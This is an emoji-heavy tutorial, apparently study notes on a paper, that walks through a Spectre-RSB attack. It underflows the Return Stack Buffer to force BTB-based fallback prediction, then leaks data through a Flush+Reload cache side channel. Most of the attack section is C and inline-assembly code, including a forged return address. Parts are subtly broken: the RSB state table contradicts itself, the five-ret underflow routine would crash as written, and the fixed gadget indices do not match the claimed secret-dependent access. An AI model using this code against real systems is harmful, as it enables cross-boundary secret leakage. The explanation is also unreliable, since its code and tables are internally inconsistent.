

💥 RSBA Fallback via RSB Underflow (Figure 7)

🎯 Goal:

Trigger RSBA (Return Stack Buffer Alternative) fallback prediction on a CPU where:
	•	🧠 The Return Stack Buffer (RSB) has 4 entries
	•	🔁 When RSB underflows, the CPU falls back to alternative predictors like IP-based BTB

✅ This attack is classified as Spectre-RSB, a subtype of Spectre v2 (mistrained return predictions), falling back to BTB-based return prediction.

⸻

🔁 Step-by-Step Algorithm to Trigger RSBA Fallback

🔧 CPU Assumptions
	•	RSB size = 4 entries
	•	RSB is a LIFO stack of return addresses
	•	call → pushes return address into RSB
	•	ret → pops from RSB and speculates to predicted return address
	•	If RSB is empty, CPU performs RSBA fallback using:
	•	IP-based BTB
	•	Or path-based prediction

⸻

✅ Step 1: RSB Filling Phase (Training/Pre-conditioning)

void Gadget0() { Touch(rb[0]); return; }
void Gadget1() { Touch(rb[1]); return; }
void Gadget2() { Touch(rb[2]); return; }
void Gadget3() { Touch(rb[3]); return; }

Call each gadget to fill the RSB:

Gadget0();  // pushes ret@Gadget0
Gadget1();  // pushes ret@Gadget1
Gadget2();  // pushes ret@Gadget2
Gadget3();  // pushes ret@Gadget3

📦 RSB state after this:

Top → [ret@G3, ret@G2, ret@G1, ret@G0]


⸻

✅ Step 2: Cause RSB Underflow via Extra Returns

Execute more ret instructions than calls to deplete the RSB:

void EmptyRSB() {
    asm volatile (
        "ret\n"  // pops ret@G3
        "ret\n"  // pops ret@G2
        "ret\n"  // pops ret@G1
        "ret\n"  // pops ret@G0 → RSB empty
        "ret\n"  // RSB underflow → triggers fallback!
    );
}

🧠 Note: These returns are not from actual calls. The return address is often forged using frame pointer tricks to avoid crashes.

⸻

✅ Step 3: Train RSBA Predictor (optional)

Some CPUs support fallback predictors (RSBA) based on BTB. You can train these predictors before the attack:

for (int i = 0; i < 100000; ++i) {
    A();  // A() always returns to GadgetX
}

This trains the BTB to associate return sites → gadget entry points.

⸻

✅ Step 4: Execute Return and Trigger RSBA Fallback

Now with an empty RSB, trigger a ret with a forged return address:

__attribute__((noinline)) void TriggerRSBAFallback() {
    uint64_t *ret_addr = (uint64_t *)__builtin_frame_address(0) + 1;
    *ret_addr = (uint64_t)&&skip;
    asm volatile ("ret");

skip:
    // Execution resumes here
}

🎯 During speculation, CPU will fall back to BTB prediction → may speculatively jump to a gadget like Gadget2().

⸻

✅ Step 5: Detect Speculative Gadget via Side Channel

Check which cache line was accessed speculatively:

for (int i = 0; i < 4; ++i) {
    if (ReloadAccess(&rb[i * 4096])) {
        printf("Speculatively returned to Gadget %d\n", i);
    }
}


⸻

📊 Final RSB Behavior Summary (RSB size = 4)

Step	Instruction	RSB State	Action
1	call Gadget0	[ret@G0]	Returns to Gadget0
2	call Gadget1	[ret@G1, ret@G0]	Returns to Gadget1
3	call Gadget2	[ret@G2, ret@G1, ret@G0]	Returns to Gadget2
4	call Gadget3	[ret@G3, ret@G2, ret@G1, ret@G0]	Returns to Gadget3
5	ret	[ret@G2, ret@G1, ret@G0]	Returns to Gadget3
6	ret	[ret@G1, ret@G0]	Returns to Gadget2
7	ret	[ret@G0]	Returns to Gadget1
8	ret	[]	Returns to Gadget0
9	ret	RSB underflow	RSBA fallback occurs


⸻

✅ Summary: Algorithmic Flow

1. Fill RSB via 4 real calls → RSB = [G3, G2, G1, G0]
2. Return 5 times (extra one triggers underflow)
3. Optional: Train RSBA (e.g., IP-based BTB)
4. Forge return → ret speculates using fallback
5. Speculation hits a gadget → Touches secret-dependent cache line
6. Measure which line was accessed via ReloadAccess()


⸻

🧠 Spectre Variant Classification

Component	Description	Spectre Variant
RSB training	Calls to known gadgets	Spectre-RSB
Fallback prediction	BTB-based return speculation	Spectre v2 / BTB variant
Gadget execution	Speculative Touch(reloadbuffer[i])	Shared with all Spectre
Side-channel read	ReloadAccess timing	Flush+Reload (Spectre SCA)


⸻

📈 Mermaid Flow Diagram

graph TD
  A[Start] --> B[Train RSB with 4 calls: Gadget0..3]
  B --> C[Optional: Train RSBA with calls from IP → GadgetX]
  C --> D[Flush reloadbuffer]
  D --> E[Trigger 5 ret instructions (RSB underflow)]
  E --> F[RSB is empty → CPU falls back to RSBA (BTB)]
  F --> G[Speculative execution of GadgetX]
  G --> H[Touch(reloadbuffer[secret])]
  H --> I[Measure cache via ReloadAccess()]
  I --> J[Secret-dependent cache line ]
